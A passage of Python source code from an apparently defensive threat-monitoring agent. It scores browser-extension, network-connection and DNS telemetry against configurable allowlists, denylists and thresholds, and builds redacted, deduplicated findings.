                    ),
                    source_type="browser_extension",
                    source_id=extension_id,
                    rule_id="EXTENSION_HIGH_IMPACT_PERMISSIONS",
                    indicators=[
                        f"permission:{permission}"
                        for permission in risky_permissions
                    ],
                    evidence=self._evidence(
                        {
                            "extension_id": extension_id,
                            "name": name,
                            "version": version,
                            "browser": browser,
                            "risky_permissions": risky_permissions,
                        }
                    ),
                    recommendations=[
                        "Confirm each permission is required for the extension's purpose.",
                        "Verify the extension publisher and installation source.",
                        "Route disablement through Security Agent when unauthorized.",
                    ],
                    extension_id=extension_id or None,
                )
            )

        name_matches = _match_patterns(
            name,
            self._extension_name_patterns,
        )

        if name_matches:
            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.BROWSER_EXTENSION,
                    risk_score=35,
                    title="Browser extension name requires review",
                    description=(
                        "The extension name matched one or more configurable "
                        "review indicators. This is a weak heuristic."
                    ),
                    source_type="browser_extension",
                    source_id=extension_id,
                    rule_id="EXTENSION_NAME_INDICATOR",
                    indicators=[
                        f"name_pattern:{pattern}"
                        for pattern in name_matches
                    ],
                    evidence=self._evidence(
                        {
                            "extension_id": extension_id,
                            "name": name,
                            "version": version,
                            "browser": browser,
                        }
                    ),
                    recommendations=[
                        "Verify the extension publisher, reviews, and source.",
                        "Review requested permissions and recent update history.",
                    ],
                    extension_id=extension_id or None,
                )
            )

        if install_source in {
            "developer",
            "unpacked",
            "sideloaded",
            "external",
            "unknown",
        }:
            score = 58 if install_source != "unknown" else 45

            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.BROWSER_EXTENSION,
                    risk_score=score,
                    title="Browser extension was installed outside the normal store flow",
                    description=(
                        "The extension installation source indicates an "
                        "unpacked, sideloaded, external, developer, or unknown "
                        "installation."
                    ),
                    source_type="browser_extension",
                    source_id=extension_id,
                    rule_id="EXTENSION_NON_STORE_INSTALL",
                    indicators=[
                        f"install_source:{install_source}"
                    ],
                    evidence=self._evidence(
                        {
                            "extension_id": extension_id,
                            "name": name,
                            "version": version,
                            "browser": browser,
                            "install_source": install_source,
                        }
                    ),
                    recommendations=[
                        "Confirm the extension was intentionally installed.",
                        "Verify the package source and code-signing metadata.",
                    ],
                    extension_id=extension_id or None,
                )
            )

        update_domain = _extract_host(update_url)

        if update_domain and not self._domain_is_allowed(update_domain):
            if self._domain_is_denied(update_domain):
                score = 95
                rule_id = "EXTENSION_DENIED_UPDATE_DOMAIN"
                title = "Extension updates from a denied domain"
            else:
                risky, indicators = _is_high_risk_domain(
                    update_domain,
                    self.monitor_config.high_risk_tlds,
                    self.monitor_config.dynamic_dns_suffixes,
                )
                if not risky:
                    indicators = []

                score = 55 if risky else 0
                rule_id = "EXTENSION_RISKY_UPDATE_DOMAIN"
                title = "Extension update domain requires review"

            if score:
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.BROWSER_EXTENSION,
                        risk_score=score,
                        title=title,
                        description=(
                            "The extension update source matched a configured "
                            "domain risk or denylist indicator."
                        ),
                        source_type="browser_extension",
                        source_id=extension_id,
                        rule_id=rule_id,
                        indicators=[
                            *(
                                indicators
                                if "indicators" in locals()
                                else []
                            ),
                            f"update_domain:{self._redact_domain(update_domain)}",
                        ],
                        evidence=self._evidence(
                            {
                                "extension_id": extension_id,
                                "name": name,
                                "update_domain": self._redact_domain(
                                    update_domain
                                ),
                            }
                        ),
                        recommendations=[
                            "Verify the extension update URL and publisher.",
                            "Review the extension package before allowing updates.",
                        ],
                        extension_id=extension_id or None,
                    )
                )

        disabled_by_policy = _coerce_bool(
            extension.get("disabled_by_policy"),
            False,
        )
        enabled = _coerce_bool(extension.get("enabled"), True)

        if disabled_by_policy and enabled:
            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.DEFENSE_EVASION,
                    risk_score=82,
                    title="Extension appears enabled despite policy disablement",
                    description=(
                        "Telemetry indicates the extension is enabled even "
                        "though policy metadata marks it as disabled."
                    ),
                    source_type="browser_extension",
                    source_id=extension_id,
                    rule_id="EXTENSION_POLICY_BYPASS",
                    indicators=["extension_enabled_despite_policy"],
                    evidence=self._evidence(
                        {
                            "extension_id": extension_id,
                            "name": name,
                            "browser": browser,
                        }
                    ),
                    recommendations=[
                        "Verify browser policy enforcement and profile integrity.",
                        "Escalate changes through Security Agent and Policy Engine.",
                    ],
                    extension_id=extension_id or None,
                )
            )

        return findings

    # =========================================================================
    # Network and DNS analysis
    # =========================================================================

    def _analyze_network_connection(
        self,
        connection: Mapping[str, Any],
        user_id: str,
        workspace_id: str,
    ) -> List[ThreatFinding]:
        """Analyze one network connection."""
        findings: List[ThreatFinding] = []

        connection_id = _normalize_text(
            connection.get("connection_id")
            or connection.get("id")
            or _short_hash(connection)
        )
        pid = _coerce_int(connection.get("pid"), -1)
        process_name = _normalize_text(
            connection.get("process_name")
            or connection.get("name")
        )
        remote_address = _normalize_text(
            connection.get("remote_address")
            or connection.get("remote_ip")
            or connection.get("destination_ip")
            or connection.get("destination")
        )
        remote_host = _normalize_text(
            connection.get("remote_host")
            or connection.get("hostname")
            or connection.get("domain")
        )
        remote_port = _coerce_int(
            connection.get("remote_port")
            or connection.get("destination_port"),
            0,
        )
        protocol = _normalize_lower(
            connection.get("protocol")
            or connection.get("transport")
            or connection.get("type")
        )
        state = _normalize_lower(
            connection.get("status")
            or connection.get("state")
        )

        if remote_address and self._ip_is_allowed(remote_address):
            return findings

        if remote_host and self._domain_is_allowed(remote_host):
            return findings

        if remote_address and self._ip_is_denied(remote_address):
            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.NETWORK,
                    risk_score=99,
                    title="Connection to a denied IP address",
                    description=(
                        "A network connection matched the configured IP denylist."
                    ),
                    source_type="network_connection",
                    source_id=connection_id,
                    rule_id="NETWORK_DENIED_IP",
                    indicators=[
                        f"denied_ip:{self._redact_ip(remote_address)}"
                    ],
                    evidence=self._evidence(
                        {
                            "connection_id": connection_id,
                            "pid": pid,
                            "process_name": process_name,
                            "remote_address": self._redact_ip(
                                remote_address
                            ),
                            "remote_port": remote_port,
                            "protocol": protocol,
                            "state": state,
                        }
                    ),
                    recommendations=[
                        "Escalate the connection to Security Agent immediately.",
                        "Correlate the destination with process and DNS telemetry.",
                        "Do not block or terminate without approved policy action.",
                    ],
                    process_id=pid if pid >= 0 else None,
                    process_name=process_name or None,
                    remote_address=self._redact_ip(remote_address),
                    remote_port=remote_port or None,
                )
            )

        if remote_host and self._domain_is_denied(remote_host):
            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.NETWORK,
                    risk_score=99,
                    title="Connection to a denied domain",
                    description=(
                        "A network connection matched the configured domain denylist."
                    ),
                    source_type="network_connection",
                    source_id=connection_id,
                    rule_id="NETWORK_DENIED_DOMAIN",
                    indicators=[
                        f"denied_domain:{self._redact_domain(remote_host)}"
                    ],
                    evidence=self._evidence(
                        {
                            "connection_id": connection_id,
                            "pid": pid,
                            "process_name": process_name,
                            "remote_host": self._redact_domain(
                                remote_host
                            ),
                            "remote_port": remote_port,
                            "protocol": protocol,
                        }
                    ),
                    recommendations=[
                        "Escalate the domain contact to Security Agent.",
                        "Review the originating process and browser activity.",
                    ],
                    process_id=pid if pid >= 0 else None,
                    process_name=process_name or None,
                    remote_address=self._redact_domain(remote_host),
                    remote_port=remote_port or None,
                )
            )

        if (
            remote_port in self.monitor_config.suspicious_ports
            and remote_port not in self.monitor_config.port_allowlist
            and (remote_address or remote_host)
        ):
            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.NETWORK,
                    risk_score=44,
                    title="Connection uses a high-review destination port",
                    description=(
                        "The connection uses a port frequently associated with "
                        "remote administration, databases, proxies, or commonly "
                        "abused services. Port alone is not proof of malicious activity."
                    ),
                    source_type="network_connection",
                    source_id=connection_id,
                    rule_id="NETWORK_HIGH_REVIEW_PORT",
                    indicators=[
                        f"remote_port:{remote_port}"
                    ],
                    evidence=self._evidence(
                        {
                            "connection_id": connection_id,
                            "pid": pid,
                            "process_name": process_name,
                            "remote_address": self._redact_ip(
                                remote_address
                            ),
                            "remote_host": self._redact_domain(
                                remote_host
                            ),
                            "remote_port": remote_port,
                            "protocol": protocol,
                            "state": state,
                        }
                    ),
                    recommendations=[
                        "Confirm the connection is expected for the application.",
                        "Review destination ownership and process behavior.",
                    ],
                    process_id=pid if pid >= 0 else None,
                    process_name=process_name or None,
                    remote_address=(
                        self._redact_ip(remote_address)
                        or self._redact_domain(remote_host)
                    ),
                    remote_port=remote_port,
                )
            )

        if remote_host and not self._domain_is_allowed(remote_host):
            risky, indicators = _is_high_risk_domain(
                remote_host,
                self.monitor_config.high_risk_tlds,
                self.monitor_config.dynamic_dns_suffixes,
            )

            if risky:
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.NETWORK,
                        risk_score=42,
                        title="Connection destination domain requires review",
                        description=(
                            "The destination domain matched one or more "
                            "lightweight risk indicators."
                        ),
                        source_type="network_connection",
                        source_id=connection_id,
                        rule_id="NETWORK_RISKY_DOMAIN",
                        indicators=indicators,
                        evidence=self._evidence(
                            {
                                "connection_id": connection_id,
                                "pid": pid,
                                "process_name": process_name,
                                "remote_host": self._redact_domain(
                                    remote_host
                                ),
                                "remote_port": remote_port,
                            }
                        ),
                        recommendations=[
                            "Verify the destination domain reputation and ownership.",
                            "Correlate the request with DNS and browser telemetry.",
                        ],
                        process_id=pid if pid >= 0 else None,
                        process_name=process_name or None,
                        remote_address=self._redact_domain(remote_host),
                        remote_port=remote_port or None,
                    )
                )

        transferred_bytes = _coerce_int(
            connection.get("bytes_sent")
            or connection.get("outbound_bytes"),
            0,
        )

        if transferred_bytes >= 500 * 1024 * 1024:
            findings.append(
                self._create_finding(
                    user_id=user_id,
                    workspace_id=workspace_id,
                    category=ThreatCategory.NETWORK,
                    risk_score=52,
                    title="Large outbound network transfer detected",
                    description=(
                        "A connection reported a large amount of outbound data. "
                        "This may be legitimate but requires validation."
                    ),
                    source_type="network_connection",
                    source_id=connection_id,
                    rule_id="NETWORK_LARGE_OUTBOUND_TRANSFER",
                    indicators=[
                        f"outbound_bytes:{transferred_bytes}"
                    ],
                    evidence=self._evidence(
                        {
                            "connection_id": connection_id,
                            "pid": pid,
                            "process_name": process_name,
                            "remote_address": self._redact_ip(
                                remote_address
                            ),
                            "remote_host": self._redact_domain(
                                remote_host
                            ),
                            "remote_port": remote_port,
                            "bytes_sent": transferred_bytes,
                        }
                    ),
                    recommendations=[
                        "Confirm the transfer is expected for the user and application.",
                        "Review destination ownership and transferred data classification.",
                    ],
                    process_id=pid if pid >= 0 else None,
                    process_name=process_name or None,
                    remote_address=(
                        self._redact_ip(remote_address)
                        or self._redact_domain(remote_host)
                    ),
                    remote_port=remote_port or None,
                )
            )

        return findings

    def _analyze_network_aggregates(
        self,
        connections: Sequence[Mapping[str, Any]],
        user_id: str,
        workspace_id: str,
    ) -> List[ThreatFinding]:
        """Analyze aggregate connection patterns."""
        findings: List[ThreatFinding] = []

        by_process: Dict[str, List[Mapping[str, Any]]] = defaultdict(list)
        by_destination: Counter[str] = Counter()

        for connection in connections:
            process_key = _normalize_text(
                connection.get("pid")
                or connection.get("process_name")
                or "unknown"
            )
            by_process[process_key].append(connection)

            destination = _normalize_text(
                connection.get("remote_address")
                or connection.get("remote_ip")
                or connection.get("remote_host")
                or connection.get("domain")
            )

            if destination:
                by_destination[destination] += 1

        for process_key, process_connections in by_process.items():
            destination_set = {
                _normalize_text(
                    item.get("remote_address")
                    or item.get("remote_ip")
                    or item.get("remote_host")
                    or item.get("domain")
                )
                for item in process_connections
            }
            destination_set.discard("")

            if len(process_connections) >= (
                self.monitor_config.high_connection_count_threshold
            ):
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.NETWORK,
                        risk_score=48,
                        title="Process created an unusually high number of connections",
                        description=(
                            "A process exceeded the configured connection-count "
                            "threshold during the observed snapshot."
                        ),
                        source_type="network_aggregate",
                        source_id=process_key,
                        rule_id="NETWORK_HIGH_CONNECTION_COUNT",
                        indicators=[
                            f"connection_count:{len(process_connections)}"
                        ],
                        evidence=self._evidence(
                            {
                                "process_key": process_key,
                                "connection_count": len(process_connections),
                                "unique_destination_count": len(
                                    destination_set
                                ),
                            }
                        ),
                        recommendations=[
                            "Confirm whether the process is a browser, proxy, crawler, or expected service.",
                            "Review destination diversity and connection timing.",
                        ],
                    )
                )

            if len(destination_set) >= (
                self.monitor_config.unique_destination_threshold
            ):
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.NETWORK,
                        risk_score=54,
                        title="Process contacted many unique destinations",
                        description=(
                            "A single process contacted an unusually large "
                            "number of distinct destinations."
                        ),
                        source_type="network_aggregate",
                        source_id=process_key,
                        rule_id="NETWORK_HIGH_DESTINATION_DIVERSITY",
                        indicators=[
                            f"unique_destinations:{len(destination_set)}"
                        ],
                        evidence=self._evidence(
                            {
                                "process_key": process_key,
                                "connection_count": len(process_connections),
                                "unique_destination_count": len(
                                    destination_set
                                ),
                            }
                        ),
                        recommendations=[
                            "Verify whether destination diversity is expected.",
                            "Review the process role, installed software, and DNS history.",
                        ],
                    )
                )

        for destination, count in by_destination.items():
            if count >= self.monitor_config.destination_burst_threshold:
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.NETWORK,
                        risk_score=41,
                        title="Repeated connection burst to one destination",
                        description=(
                            "The same destination received a high number of "
                            "connections during the observed snapshot."
                        ),
                        source_type="network_aggregate",
                        source_id=_short_hash(destination),
                        rule_id="NETWORK_DESTINATION_BURST",
                        indicators=[
                            f"connection_count:{count}"
                        ],
                        evidence=self._evidence(
                            {
                                "destination": (
                                    self._redact_ip(destination)
                                    if _looks_like_ip_literal_host(destination)
                                    else self._redact_domain(destination)
                                ),
                                "connection_count": count,
                            }
                        ),
                        recommendations=[
                            "Confirm whether the destination is an expected API or service.",
                            "Review connection failures, retries, and process ownership.",
                        ],
                    )
                )

        return findings

    def _analyze_dns_events(
        self,
        dns_events: Sequence[Mapping[str, Any]],
        user_id: str,
        workspace_id: str,
    ) -> List[ThreatFinding]:
        """Analyze DNS event metadata."""
        findings: List[ThreatFinding] = []
        domain_counts: Counter[str] = Counter()
        process_domains: Dict[str, Set[str]] = defaultdict(set)

        for event in dns_events:
            domain = _extract_host(
                event.get("domain")
                or event.get("query")
                or event.get("hostname")
            )
            process_key = _normalize_text(
                event.get("pid")
                or event.get("process_name")
                or "unknown"
            )
            response_ip = _normalize_text(
                event.get("response_ip")
                or event.get("resolved_ip")
                or event.get("answer")
            )

            if not domain:
                continue

            domain_counts[domain] += 1
            process_domains[process_key].add(domain)

            if self._domain_is_allowed(domain):
                continue

            if self._domain_is_denied(domain):
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.DNS,
                        risk_score=98,
                        title="DNS request for a denied domain",
                        description=(
                            "A DNS query matched the configured domain denylist."
                        ),
                        source_type="dns_event",
                        source_id=_short_hash(
                            {
                                "domain": domain,
                                "process": process_key,
                            }
                        ),
                        rule_id="DNS_DENIED_DOMAIN",
                        indicators=[
                            f"denied_domain:{self._redact_domain(domain)}"
                        ],
                        evidence=self._evidence(
                            {
                                "domain": self._redact_domain(domain),
                                "process_key": process_key,
                                "response_ip": self._redact_ip(
                                    response_ip
                                ),
                            }
                        ),
                        recommendations=[
                            "Review the originating process or browser profile.",
                            "Escalate policy action through Security Agent.",
                        ],
                    )
                )
                continue

            risky, indicators = _is_high_risk_domain(
                domain,
                self.monitor_config.high_risk_tlds,
                self.monitor_config.dynamic_dns_suffixes,
            )

            if risky:
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.DNS,
                        risk_score=38,
                        title="DNS request domain requires review",
                        description=(
                            "The queried domain matched one or more lightweight "
                            "domain-risk indicators."
                        ),
                        source_type="dns_event",
                        source_id=_short_hash(
                            {
                                "domain": domain,
                                "process": process_key,
                            }
                        ),
                        rule_id="DNS_RISKY_DOMAIN",
                        indicators=indicators,
                        evidence=self._evidence(
                            {
                                "domain": self._redact_domain(domain),
                                "process_key": process_key,
                                "response_ip": self._redact_ip(
                                    response_ip
                                ),
                            }
                        ),
                        recommendations=[
                            "Verify domain reputation and ownership.",
                            "Correlate with download, extension, and process events.",
                        ],
                    )
                )

        for domain, count in domain_counts.items():
            if count >= self.monitor_config.dns_query_burst_threshold:
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.DNS,
                        risk_score=43,
                        title="High-volume DNS query burst detected",
                        description=(
                            "A domain was queried more frequently than the "
                            "configured DNS burst threshold."
                        ),
                        source_type="dns_aggregate",
                        source_id=_short_hash(domain),
                        rule_id="DNS_QUERY_BURST",
                        indicators=[
                            f"query_count:{count}"
                        ],
                        evidence=self._evidence(
                            {
                                "domain": self._redact_domain(domain),
                                "query_count": count,
                            }
                        ),
                        recommendations=[
                            "Confirm whether repeated DNS lookups are expected.",
                            "Review application retry behavior and network errors.",
                        ],
                    )
                )

        for process_key, domains in process_domains.items():
            if len(domains) >= self.monitor_config.unique_destination_threshold:
                findings.append(
                    self._create_finding(
                        user_id=user_id,
                        workspace_id=workspace_id,
                        category=ThreatCategory.DNS,
                        risk_score=49,
                        title="Process queried many unique domains",
                        description=(
                            "A process generated DNS queries for an unusually "
                            "large number of distinct domains."
                        ),
                        source_type="dns_aggregate",
                        source_id=process_key,
                        rule_id="DNS_HIGH_DOMAIN_DIVERSITY",
                        indicators=[
                            f"unique_domains:{len(domains)}"
                        ],
                        evidence=self._evidence(
                            {
                                "process_key": process_key,
                                "unique_domain_count": len(domains),
                            }
                        ),
                        recommendations=[
                            "Confirm whether the process is a browser, crawler, proxy, or expected network service.",
                            "Review related process and connection activity.",
                        ],
                    )
                )

        return findings

    # =========================================================================
    # Finding, redaction, and configuration helpers
    # =========================================================================

    def _create_finding(
        self,
        user_id: str,
        workspace_id: str,
        category: Union[ThreatCategory, str],
        risk_score: float,
        title: str,
        description: str,
        source_type: str,
        source_id: Optional[str] = None,
        rule_id: Optional[str] = None,
        indicators: Optional[Sequence[str]] = None,
        evidence: Optional[Mapping[str, Any]] = None,
        recommendations: Optional[Sequence[str]] = None,
        process_id: Optional[int] = None,
        process_name: Optional[str] = None,
        file_path: Optional[str] = None,
        extension_id: Optional[str] = None,
        remote_address: Optional[str] = None,
        remote_port: Optional[int] = None,
        metadata: Optional[Mapping[str, Any]] = None,
    ) -> ThreatFinding:
        """Create a normalized tenant-scoped threat finding."""
        normalized_category = (
            category.value
            if isinstance(category, ThreatCategory)
            else _normalize_lower(category)
        )
        normalized_score = round(_clamp(risk_score), 2)
        severity = _severity_from_score(normalized_score).value

        fingerprint_payload = {
            "user_id": user_id,
            "workspace_id": workspace_id,
            "category": normalized_category,
            "rule_id": rule_id,
            "source_type": source_type,
            "source_id": source_id,
            "indicators": sorted(indicators or []),
        }

        finding_id = f"threat_{_short_hash(fingerprint_payload, 24)}"

        return ThreatFinding(
            finding_id=finding_id,
            category=normalized_category,
            severity=severity,
            title=_normalize_text(title),
            description=_normalize_text(description),
            risk_score=normalized_score,
            user_id=user_id,
            workspace_id=workspace_id,
            source_type=_normalize_text(source_type),
            source_id=_normalize_text(source_id) or None,
            rule_id=_normalize_text(rule_id) or None,
            indicators=_deduplicate_strings(indicators or []),
            evidence=_json_safe(evidence or {}),
            recommendations=_deduplicate_strings(
                recommendations or []
            ),
            process_id=process_id,
            process_name=_normalize_text(process_name) or None,
            file_path=self._redact_path(file_path),
            extension_id=_normalize_text(extension_id) or None,
            remote_address=_normalize_text(remote_address) or None,
            remote_port=remote_port,
            metadata=_json_safe(metadata or {}),
        )

    def _evidence(self, evidence: Mapping[str, Any]) -> Dict[str, Any]:
        """Return evidence according to configured privacy behavior."""
        if not self.monitor_config.include_evidence:
            return {
                "evidence_hash": _stable_hash(evidence),
                "evidence_included": False,
            }

        sanitized = {
            key: value
            for key, value in evidence.items()
            if value not in (None, "", [], {})
        }

        return _json_safe(sanitized)

    def _deduplicate_findings(
        self,
        findings: Sequence[ThreatFinding],
    ) -> List[ThreatFinding]:
        """Merge duplicate findings and retain highest risk score."""
        by_id: Dict[str, ThreatFinding] = {}

        for finding in findings:
            existing = by_id.get(finding.finding_id)

            if existing is None:
                by_id[finding.finding_id] = finding
                continue

            existing.last_seen = _utc_now().isoformat()
            existing.risk_score = max(
                existing.risk_score,
                finding.risk_score,
            )
            existing.severity = _severity_from_score(
                existing.risk_score
            ).value
            existing.indicators = _deduplicate_strings(
                existing.indicators + finding.indicators
            )
            existing.recommendations = _deduplicate_strings(
                existing.recommendations + finding.recommendations
            )
            existing.evidence.update(finding.evidence)

        return list(by_id.values())

    @staticmethod
    def _extract_findings_from_result(
        result: Mapping[str, Any],
    ) -> List[ThreatFinding]:
        """Convert component result findings into ThreatFinding objects."""
        if not result.get("success"):
            return []

        data = result.get("data")
        if not isinstance(data, Mapping):
            return []

        raw_findings = data.get("findings")
        if not isinstance(raw_findings, Sequence):
            return []

        findings: List[ThreatFinding] = []

        for item in raw_findings:
            if not isinstance(item, Mapping):
                continue

            try:
                findings.append(
                    ThreatFinding(
                        finding_id=str(item.get("finding_id")),
                        category=str(
                            item.get("category")
                            or ThreatCategory.UNKNOWN.value
                        ),
                        severity=str(
                            item.get("severity")
                            or ThreatSeverity.INFO.value
                        ),
                        title=str(item.get("title") or ""),
                        description=str(
                            item.get("description") or ""
                        ),
                        risk_score=_coerce_float(
                            item.get("risk_score"),
                            0.0,
                        ),
                        user_id=str(item.get("user_id") or ""),
                        workspace_id=str(
                            item.get("workspace_id") or ""
                        ),
                        source_type=str(
                            item.get("source_type") or ""
                        ),
                        source_id=(
                            str(item.get("source_id"))
                            if item.get("source_id") is not None
                            else None
                        ),
                        rule_id=(
                            str(item.get("rule_id"))
                            if item.get("rule_id") is not None
                            else None
                        ),
                        indicators=list(item.get("indicators") or []),
                        evidence=dict(item.get("evidence") or {}),
                        recommendations=list(
                            item.get("recommendations") or []
                        ),
                        process_id=(
                            _coerce_int(item.get("process_id"))
                            if item.get("process_id") is not None
                            else None
                        ),
                        process_name=item.get("process_name"),
                        file_path=item.get("file_path"),
                        extension_id=item.get("extension_id"),
                        remote_address=item.get("remote_address"),
                        remote_port=(
                            _coerce_int(item.get("remote_port"))
                            if item.get("remote_port") is not None
                            else None
                        ),
                        status=str(
                            item.get("status")
                            or FindingStatus.OPEN.value
                        ),
                        first_seen=str(
                            item.get("first_seen")
                            or _utc_now().isoformat()
                        ),
                        last_seen=str(
                            item.get("last_seen")
                            or _utc_now().isoformat()
                        ),
                        metadata=dict(item.get("metadata") or {}),
                    )
                )
            except Exception:
                continue

        return findings

    def _normalize_snapshot(
        self,
        snapshot: Union[ThreatSnapshot, Mapping[str, Any]],
    ) -> ThreatSnapshot:
        """Normalize a supplied snapshot."""
        if isinstance(snapshot, ThreatSnapshot):
            return snapshot

        if not isinstance(snapshot, Mapping):
            raise TypeError(
                "snapshot must be a ThreatSnapshot or mapping."
            )

        raw = dict(snapshot)

        if (
            isinstance(raw.get("data"), Mapping)
            and isinstance(raw["data"].get("snapshot"), Mapping)
        ):
            raw = dict(raw["data"]["snapshot"])
        elif isinstance(raw.get("snapshot"), Mapping):
            raw = dict(raw["snapshot"])

        return ThreatSnapshot(
            processes=self._normalize_record_list(
                raw.get("processes")
            ),
            scripts=self._normalize_record_list(
                raw.get("scripts")
            ),
            downloads=self._normalize_record_list(
                raw.get("downloads")
            ),
            browser_extensions=self._normalize_record_list(
                raw.get("browser_extensions")
                or raw.get("extensions")
            ),
            network_connections=self._normalize_record_list(
                raw.get("network_connections")
                or raw.get("connections")
            ),
            dns_events=self._normalize_record_list(
                raw.get("dns_events")
                or raw.get("dns")
            ),
            collected_at=(
                _parse_datetime(raw.get("collected_at"))
                or _utc_now()
            ).isoformat(),
            source=_normalize_text(
                raw.get("source")
                or "provided_snapshot"
            ),
            device_id=_normalize_text(
                raw.get("device_id")
            ) or None,
            session_id=_normalize_text(
                raw.get("session_id")
            ) or None,
            metadata=dict(raw.get("metadata") or {}),
        )

    @staticmethod
    def _normalize_record_list(value: Any) -> List[Dict[str, Any]]:
        """Normalize an arbitrary value into a list of dictionaries."""
        if value is None:
            return []

        if isinstance(value, Mapping):
            value = [value]

        if not isinstance(value, Sequence) or isinstance(
            value,
            (str, bytes, bytearray),
        ):
            return []

        return [
            dict(item)
            for item in value
            if isinstance(item, Mapping)
        ]

    def _normalize_components(
        self,
        components: Optional[Sequence[str]],
    ) -> List[str]:
        """Normalize requested monitoring components."""
        aliases = {
            "process": "processes",
            "processes": "processes",
            "script": "scripts",
            "scripts": "scripts",
            "download": "downloads",
            "downloads": "downloads",
            "extension": "browser_extensions",
            "extensions": "browser_extensions",
            "browser_extension": "browser_extensions",
            "browser_extensions": "browser_extensions",
            "network": "network",
            "connections": "network",
            "network_connections": "network",
            "dns": "network",
        }

        if not components:
            requested = [
                "processes",
                "scripts",
                "downloads",
                "browser_extensions",
                "network",
            ]
        else:
            requested = []

            for component in components:
                normalized = aliases.get(
                    _normalize_lower(component)
                )

                if normalized and normalized not in requested:
                    requested.append(normalized)

        enabled: List[str] = []

        if (
            "processes" in requested
            and self.monitor_config.enable_process_monitoring
        ):
            enabled.append("processes")

        if (
            "scripts" in requested
            and self.monitor_config.enable_script_monitoring
        ):
            enabled.append("scripts")

        if (
            "downloads" in requested
            and self.monitor_config.enable_download_monitoring
        ):
            enabled.append("downloads")

        if (
            "browser_extensions" in requested
            and self.monitor_config.enable_extension_monitoring
        ):
            enabled.append("browser_extensions")

        if (
            "network" in requested
            and self.monitor_config.enable_network_monitoring
        ):
            enabled.append("network")

        return enabled

    def _redact_command_line(self, command_line: str) -> str:
        """Redact or hash command-line data based on configuration."""
        if not command_line:
            return ""

        if not self.monitor_config.redact_command_lines:
            return command_line[:2_000]

        return (
            f"[redacted_command_line:"
            f"{_short_hash(command_line, 20)}]"
        )

    def _redact_path(self, path: Optional[str]) -> Optional[str]:
        """Redact user-specific path components while keeping basename."""
        normalized = _normalize_text(path)
        if not normalized:
            return None

        basename = _safe_basename(normalized)

        if self.monitor_config.hash_sensitive_values:
            return (
                f"[path:{_short_hash(normalized, 16)}]/"
                f"{basename}"
            )

        return normalized

    def _redact_domain(self, domain: Any) -> str:
        """Redact domain values if configured."""
        host = _extract_host(domain)
        if not host:
            return ""

        if not self.monitor_config.redact_urls:
            return host

        if self.monitor_config.hash_sensitive_values:
            return f"[domain:{_short_hash(host, 16)}]"

        return host

    def _redact_ip(self, value: Any) -> str:
        """Redact IP addresses if configured."""
        ip_value = _normalize_text(value)
        if not ip_value:
            return ""

        if self.monitor_config.hash_sensitive_values:
            return f"[ip:{_short_hash(ip_value, 16)}]"

        return ip_value

    def _domain_is_allowed(self, domain: str) -> bool:
        """Check domain allowlist using exact or suffix matching."""
        host = _extract_host(domain)

        for allowed in self.monitor_config.domain_allowlist:
            normalized = _extract_host(allowed)
            if host == normalized or host.endswith(f".{normalized}"):
                return True

        return False

    def _domain_is_denied(self, domain: str) -> bool:
        """Check domain denylist using exact or suffix matching."""
        host = _extract_host(domain)

        for denied in self.monitor_config.domain_denylist:
            normalized = _extract_host(denied)
            if host == normalized or host.endswith(f".{normalized}"):
                return True

        return False

    def _ip_is_allowed(self, value: str) -> bool:
        """Check exact IP allowlist."""
        return _normalize_text(value) in {
            _normalize_text(item)
            for item in self.monitor_config.ip_allowlist
        }

    def _ip_is_denied(self, value: str) -> bool:
        """Check exact IP denylist."""
        return _normalize_text(value) in {
            _normalize_text(item)
            for item in self.monitor_config.ip_denylist
        }

    def _build_config(
        self,
        config: Optional[
            Union[ThreatMonitorConfig, Mapping[str, Any]]
        ],
    ) -> ThreatMonitorConfig:
        """Build configuration with safe type normalization."""
        if isinstance(config, ThreatMonitorConfig):
            return config

        raw = dict(config or {})
        field_names = {
            field.name
            for field in dataclasses.fields(ThreatMonitorConfig)
        }

        normalized: Dict[str, Any] = {
            key: value
            for key, value in raw.items()
            if key in field_names
        }

        set_fields = {
            "suspicious_process_names",
            "suspicious_ports",
            "suspicious_extension_permissions",
            "high_risk_tlds",
            "dynamic_dns_suffixes",
            "allowed_dns_servers",
            "process_allowlist",
            "process_path_allowlist",
            "script_hash_allowlist",
            "download_hash_allowlist",
            "extension_id_allowlist",
            "domain_allowlist",
            "ip_allowlist",
            "port_allowlist",
            "process_name_denylist",
            "domain_denylist",
            "ip_denylist",
            "extension_id_denylist",
        }

        tuple_fields = {
            "suspicious_command_patterns",
            "suspicious_script_patterns",
            "suspicious_download_name_patterns",
            "suspicious_extension_name_patterns",
        }

        for field_name in set_fields:
            if field_name in normalized:
                value = normalized[field_name]

                if isinstance(value, str):
                    value = [
                        item.strip()
                        for item in value.split(",")
                        if item.strip()
                    ]

                normalized[field_name] = set(value or [])

        for field_name in tuple_fields:
            if field_name in normalized:
                value = normalized[field_name]

                if isinstance(value, str):
                    value = [value]

                normalized[field_name] = tuple(value or [])

        return ThreatMonitorConfig(**normalized)

    # =========================================================================
    # Registry and dashboard integration
    # =========================================================================

    def get_agent_manifest(self) -> Dict[str, Any]:
        """Return Agent Registry/Loader manifest."""
        return {
            "agent_name": self.agent_name,
            "module_name": self.module_name,
